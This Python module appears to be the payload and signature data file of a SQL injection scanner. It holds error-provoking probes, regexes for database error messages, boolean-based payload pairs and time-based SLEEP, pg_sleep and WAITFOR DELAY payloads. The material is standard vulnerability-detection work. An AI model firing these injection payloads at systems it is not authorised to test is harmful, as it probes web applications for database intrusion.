"""Payloads and DBMS error signatures used by the detectors.

Kept as plain data so it's easy to extend and, later, to feed the ML training set.
"""

from __future__ import annotations

import re
from typing import Dict, List, Tuple

# --- Error-based --------------------------------------------------------------
# Characters that tend to break a naive query and surface a DB error.
ERROR_PROBES: List[str] = ["'", '"', "')", "';", "\\", "`"]

# DBMS -> compiled regexes matching that engine's error text.
# Signatures adapted from well-known public fingerprints (sqlmap-style).
_ERROR_PATTERNS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*\bmysqli?_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"Unknown column '[^']+' in 'field list'",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"pg_query\(\):",
        r"pg_exec\(\):",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
    ],
    "Microsoft SQL Server": [
        r"Driver.* SQL[\-\_ ]*Server",
        r"OLE DB.* SQL Server",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client error",
        r"System\.Data\.SqlClient\.SqlException",
    ],
    "Oracle": [
        r"\bORA-\d{4,5}",
        r"Oracle error",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"sqlite3.OperationalError",
        r"unrecognized token:",
    ],
}

# Precompile for speed.
ERROR_SIGNATURES: Dict[str, List[re.Pattern]] = {
    dbms: [re.compile(p, re.IGNORECASE) for p in pats]
    for dbms, pats in _ERROR_PATTERNS.items()
}


def match_dbms_error(text: str) -> Tuple[str, str]:
    """Return (dbms, matched_snippet) if `text` contains a known DB error, else ("", "")."""
    for dbms, patterns in ERROR_SIGNATURES.items():
        for pat in patterns:
            m = pat.search(text)
            if m:
                return dbms, m.group(0)
    return "", ""


# --- Boolean-based ------------------------------------------------------------
# Each tuple = (TRUE payload, FALSE payload). Appended to the original value.
# A vulnerable param makes TRUE resemble the baseline and FALSE differ.
BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    (") AND 1=1-- -", ") AND 1=2-- -"),
]


# --- Time-based ---------------------------------------------------------------
# {delay} is substituted with the number of seconds to sleep.
TIME_PAYLOADS: Dict[str, List[str]] = {
    "MySQL": [
        "' AND SLEEP({delay})-- -",
        '" AND SLEEP({delay})-- -',
        " AND SLEEP({delay})",
        "' AND (SELECT {delay} FROM (SELECT SLEEP({delay}))a)-- -",
    ],
    "PostgreSQL": [
        "' AND pg_sleep({delay})-- -",
        " ; SELECT pg_sleep({delay})-- -",
    ],
    "Microsoft SQL Server": [
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        " WAITFOR DELAY '0:0:{delay}'",
    ],
    "Oracle": [
        "' AND DBMS_LOCK.SLEEP({delay})-- -",
    ],
}


def all_time_payloads(delay: int) -> List[Tuple[str, str]]:
    """Flatten into (dbms, payload) with {delay} substituted."""
    out: List[Tuple[str, str]] = []
    for dbms, templates in TIME_PAYLOADS.items():
        for tpl in templates:
            out.append((dbms, tpl.format(delay=delay)))
    return out
